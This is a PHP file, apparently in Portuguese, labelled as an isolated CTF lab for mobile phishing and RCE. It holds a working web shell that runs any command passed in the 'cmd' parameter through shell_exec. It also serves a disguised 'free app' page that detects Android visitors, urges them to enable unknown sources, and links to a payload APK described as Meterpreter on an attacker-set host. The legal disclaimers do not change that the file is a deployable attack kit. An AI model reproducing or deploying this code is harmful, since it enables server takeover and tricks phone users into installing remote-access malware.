<?php
/**
 * vulnerable-mobile.php - Lab RCE + Phishing Mobile (Android Payload) – Apenas Estudo Isolado
 * Demonstra RCE + simulação de phishing para celular (APK com Meterpreter)
 * 
 * USO SOMENTE EM AMBIENTE CONTROLADO (VMs isoladas, sem internet real)
 * NUNCA suba em servidor público – é crime grave
 */

@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

$is_debug = isset($_GET['debug']) && $_GET['debug'] === '1';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_android = stripos($user_agent, 'Android') !== false;

// Payload APK URL (hospede em seu servidor local ou ngrok para teste)
$apk_url = 'http://SEU_IP_LOCAL:8000/payload.apk'; // MUDE PARA SEU IP/PORTA

// ================================================
// RCE básico via ?cmd= (mantido para compatibilidade CTF)
// ================================================
if (isset($_GET['cmd']) && trim($_GET['cmd']) !== '') {
    $cmd = trim($_GET['cmd']);
    $out = shell_exec($cmd . ' 2>&1') ?: 'Sem saída';
    
    if ($is_debug) {
        echo "<pre>Comando: " . htmlspecialchars($cmd) . "\n\nSaída:\n" . htmlspecialchars($out) . "</pre>";
    } else {
        header('Content-Type: text/plain');
        echo "OK";
    }
    exit;
}

// ================================================
// Página principal (disfarce + phishing mobile)
// ================================================
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>App Gratuito – Baixe Agora!</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #fff; margin: 0; padding: 0; text-align: center; }
        .container { max-width: 500px; margin: 0 auto; padding: 2rem 1rem; }
        h1 { color: #00ff88; margin-bottom: 1rem; }
        .btn { display: inline-block; background: #00cc66; color: #000; padding: 1rem 2rem; margin: 1.5rem 0; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 1.2rem; box-shadow: 0 4px 15px rgba(0,204,102,0.5); transition: all 0.3s; }
        .btn:hover { background: #00ff88; transform: scale(1.05); }
        .warning { background: rgba(255,68,68,0.2); border: 2px solid #ff4444; padding: 1rem; border-radius: 10px; margin: 2rem 0; color: #ffdddd; }
        .info { font-size: 0.9rem; color: #aaa; margin-top: 3rem; }
        .mobile-only { display: <?php echo $is_android ? 'block' : 'none'; ?>; }
        .pc-only { display: <?php echo $is_android ? 'none' : 'block'; ?>; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Baixe o App Incrível Agora!</h1>
        
        <div class="mobile-only">
            <p>Olá usuário Android! Instale nosso app exclusivo com recursos premium.</p>
            <p style="color:#ffcc00;">ATENÇÃO: Ative "Fontes Desconhecidas" nas configurações antes de instalar.</p>
            <a href="<?php echo $apk_url; ?>" class="btn" download>BAIXAR APK (Grátis!)</a>
            <p>Após instalar, abra o app para ativar os recursos.</p>
        </div>
        
        <div class="pc-only">
            <p>Este app é otimizado para celular Android. Acesse pelo seu smartphone para baixar!</p>
            <p>Escaneie o QR code ou copie o link:</p>
            <p style="word-break:break-all; background:#222; padding:1rem; border-radius:10px;"><?php echo $apk_url; ?></p>
        </div>
        
        <div class="warning">
            <strong>AVISO LEGAL – ESTUDO ISOLADO</strong><br><br>
            Este é um lab educacional simulado. NUNCA use em ambiente real ou sem autorização.<br>
            Uso não autorizado é crime (art. 154-A CP + Lei 14.155/2021).
        </div>
        
        <div class="info">
            Lab para CTF/estudo – criado para entender phishing mobile e RCE.
        </div>
    </div>
</body>
</html>
